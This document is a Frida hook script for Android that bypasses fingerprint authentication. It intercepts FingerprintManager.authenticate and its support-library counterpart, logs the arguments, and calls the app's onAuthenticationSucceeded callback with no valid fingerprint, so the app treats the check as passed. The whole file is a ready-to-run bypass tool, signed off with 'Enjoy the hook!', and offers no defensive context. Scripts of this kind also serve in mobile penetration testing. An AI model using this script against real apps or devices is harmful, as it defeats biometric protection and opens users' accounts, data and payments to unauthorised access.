console.error("[!] Enjoy the hook! - Juice :)");
Java.perform(function () {
 
    console.log('\n');
    
    var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
    var FingerprintManagerCompat = Java.use("android.support.v4.hardware.fingerprint.FingerprintManagerCompat");
 
    FingerprintManager.authenticate.overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler').implementation = function(args0, args1, args2, args3, args4){
        console.warn("[!] FingerprintManager.authenticate(args0, args1, args2, args3, args4) Hooked!");
        console.log("\t[*] args0 : " + args0);
        console.log("\t[*] args1 : " + args1);
        console.log("\t[*] args2 : " + args2);
        console.log("\t[*] args3 : " + args3);
        console.log("\t[*] args4 : " + args4);
        args3.onAuthenticationSucceeded(null);
        return this.authenticate(args0, args1, args2, args3, args4);
    };
    
    FingerprintManagerCompat.authenticate.overload('android.support.v4.hardware.fingerprint.FingerprintManagerCompat$CryptoObject', 'int', 'android.support.v4.os.CancellationSignal', 'android.support.v4.hardware.fingerprint.FingerprintManagerCompat$AuthenticationCallback', 'android.os.Handler').implementation = function(args0, args1, args2, args3, args4){
        console.warn("[!] FingerprintManagerCompat.authenticate(args0, args1, args2, args3, args4) Hooked!");
        console.log("\t[*] args0 : " + args0);
        console.log("\t[*] args1 : " + args1);
        console.log("\t[*] args2 : " + args2);
        console.log("\t[*] args3 : " + args3);
        console.log("\t[*] args4: " + args4);
        args3.onAuthenticationSucceeded(null);
        return this.authenticate(args0, args1, args2, args3, args4);
    };    
});
